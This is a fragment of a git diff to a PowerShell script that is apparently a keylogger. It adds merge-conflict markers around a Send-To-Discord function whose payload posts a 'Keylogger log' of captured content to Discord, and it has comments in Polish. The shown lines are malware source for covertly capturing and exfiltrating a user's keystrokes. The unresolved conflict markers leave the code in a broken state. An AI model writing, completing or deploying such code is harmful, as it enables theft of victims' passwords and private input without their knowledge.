@@ -1,4 +1,7 @@
+<<<<<<< HEAD
 
+=======
+>>>>>>> 149df738225c303f716cd95a6885ecd660317dc4
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -38,9 +41,13 @@ function Send-To-Discord {
 
             # Poprawiona definicja payload w HashTable
             $payload = @{
+<<<<<<< HEAD
                 content = "📝 **Keylogger log:**`n```
 $content
 ```"
+=======
+                content = "📝 **Keylogger log:**`n```\n$content\n```"
+>>>>>>> 149df738225c303f716cd95a6885ecd660317dc4
             }
 
             # Konwertowanie na JSON
